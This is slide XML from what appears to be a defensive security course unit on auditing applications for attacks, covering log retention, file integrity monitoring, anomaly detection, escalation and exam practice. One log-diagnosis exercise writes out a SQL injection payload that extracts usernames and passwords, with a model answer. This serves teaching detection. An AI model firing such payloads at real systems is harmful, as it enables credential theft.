            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Case where the act of logging was simultaneously the exploit trigger and the primary detection mechanism</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Log retention:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The determining factor in whether retroactive vulnerability hunting is possible after a delayed disclosure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Escalation lifecycle:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Detection -&gt; Triage -&gt; Escalation -&gt; Response, each link required for a real defensive outcome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Hardening Control 1: Centralized, Immutable Log Retention</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Control 1: Centralized, Immutable Log Retention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Ship off-host immediately:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Logs must be shipped to a centralized, write-once store the moment they are generated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Defends against:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The common post-compromise step of an attacker deleting local log evidence after gaining root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Write-once (immutable) storage:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Once written, records cannot be altered/deleted by normal administrative access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Retention length lesson from Log4Shell:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Retention windows must be long enough to support retroactive hunting for vulnerabilities disclosed long after the relevant traffic occurred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SP 800-92 guidance:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Define retention periods by log source criticality, not a single blanket duration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5.6.4.a.2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Control 2: Layer Signatures, FIM, and Baselining Together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 single mechanism is sufficient:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Each has a distinct blind spot the others cover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Signature-based:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Catches known payloads instantly, misses novel variants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FIM:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Catches successful file-level compromise regardless of entry vector, but only after the fact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Behavioral baselining:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Catches the slow, low-and-slow attacker under any static threshold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Mature programs:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Deploy all three and correlate outputs in a SIEM, exactly as in the FIM-plus-log correlation rule from Section II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Control 3: Tuning Signal-to-Noise and Enforcing Escalation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Target's core lesson operationalized:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Alert volume without triage capacity is a liability, not a defense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False positive:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An alert firing on benign activity, high rates cause analyst fatigue and cause real alerts to be dismissed or delayed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Required control:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Actively tune detection rules to reduce false positives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Required control:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Define in writing which severity levels trigger which escalation actions, within what time window</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Purpose:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Closes the exact organizational gap that let Target's FireEye alerts go unactioned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5.6.4.a.4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Control 4: Baseline Re-Certification via Change Management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FIM baselines must be re-certified:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Every legitimate deployment that modifies monitored files requires an authorized change-management update to the baseline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Failure mode if skipped:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The control becomes so noisy from expected changes that analysts learn to ignore its alerts entirely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Parallel to alert fatigue:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> This recreates the exact organizational failure mode described for log alerts, applied specifically to file integrity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Ties to defense-in-depth (Unit 2):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Auditing is the concrete instantiation of the 'detect' layer alongside 'prevent' and 'respond'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Exam-rewarded pattern:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Naming multiple complementary layers, never a single silver-bullet tool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5.6.4.a.5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IV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Immutable/write-once storage + retention policy by criticality:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Defends log evidence and enables retroactive hunting</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Layered signatures + FIM + baselining:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> No single mechanism is sufficient; each covers the others' blind spot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False positive / alert tuning / written escalation policy:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Closes the Target-style organizational gap</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Baseline re-certification via change management:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Prevents FIM from becoming ignored noise after legitimate deployments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Overall thesis:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Application threat auditing is a layered, mutually reinforcing program, never a single tool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Exam Decision Rule: Matching Evidence to Control</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Decision Rule: Matching Evidence to Control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Malicious string in a request:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Answer is log/signature analysis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File on disk changed/added/modified with no change ticket:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Answer is FIM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Volume, timing, or geographic pattern unusual for a specific user/system, no obvious string or file change:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Answer is anomaly detection / behavioral baselining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Many scenarios require naming more than one control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Practice habit:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Before answering, identify exactly which category of evidence the prompt describes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5.6.5.a.2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Diagnose This Log Line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Given:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A log entry showing status 200, a query parameter containing </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>' UNION SELECT username,password,3 FROM users--</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>, User-Agent sqlmap</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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Identify the attack type from the payload structure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Explain why status 200 changes the severity assessment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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Name the additional log sources/controls needed to determine actual impact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Model answer components:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> UNION-based SQLi; 200 means processed not blocked; correlate with DB audit logs, FIM, and subsequent traffic from the same IP</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5.6.5.a.3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Compare the Three Detection Mechanisms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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> For signature analysis, FIM, and anomaly detection, name one scenario each would catch that the other two would miss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Signature analysis catches:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A documented, previously-seen malicious string pattern with low latency and low false positives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FIM catches:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The downstream consequence of a compromise (e.g., a web shell dropped) regardless of exploitation technique used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Anomaly detection catches:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Slow, low-and-slow attacks or insider credential misuse with no recognizable string or file change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Synthesis point:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Each control's blind spot is a different control's strength, this is why all three are deployed and correlated together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5.6.5.a.4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Application: Building an Incident Timeline from Multiple Sources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setup:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> An analyst has an access log entry, an AIDE FIM alert, and a SIEM correlation rule firing in the same 10-minute window</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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Order the three evidentiary items chronologically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Identify which item represents the initial exploitation attempt vs. the consequence vs. the synthesized alert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a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Draft the escalation action based on the CRITICAL severity correlation rule pattern shown earlier</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Skill being practiced:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Reconstructing a coherent attack narrative from disparate raw evidence, the core SOC analyst task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5.6.5.a.5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Application Threat Auditing Kill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 Attempt leaves a fingerprint:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Injection payload appears verbatim in an access log before any blocking occurs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 Consequence leaves a fingerprint:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> If the attempt succeeds, a file changes on disk, caught by FIM against a trusted baseline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 Pattern leaves a fingerprint:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> If neither a known string nor a file change is present, behavioral deviation from baseline is the only remaining signal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4, Correlation elevates confidence:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A SIEM joins signals across sources/time to distinguish real incidents from isolated noise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5, The lifecycle must complete:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Detection -&gt; triage -&gt; escalation -&gt; response, or the entire preceding chain (as in Target) accomplishes nothing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5.6   ·   5.6.5.a.6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 Topic 5.6</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Oval 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="17231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Can distinguish prevention from detection, and mitigation from auditing, in any scenario</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Oval 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="22616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09296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Can read a raw access log line and identify SQLi vs. XSS signatures, including percent-encoded variants</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Oval 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="28000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63144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Can explain why HTTP status code (200 vs 403) changes the severity of a log finding</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Oval 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="33385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16992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Can explain FIM's mechanism (baseline hash, periodic verification) and name Tripwire/AIDE as tools</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Oval 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="38770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370840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Can apply the evidence-to-control decision rule (string -&gt; signature; file change -&gt; FIM; pattern -&gt; anomaly detection)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Oval 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4415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424688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Can use the Target case study to argue detection capability != detection outcome</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Oval 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="49540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478536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Can use Log4Shell to argue why log retention length matters for retroactive hunting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Oval 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="54924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0" name="Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="786384" y="532384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Can name all four Section IV hardening controls and tie each to the case-study failure it addresses</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Oval 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="60309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2" name="Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="786384" y="586232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 ]</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1100" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Can walk the full five-step auditing kill chain from attempt to response lifecycle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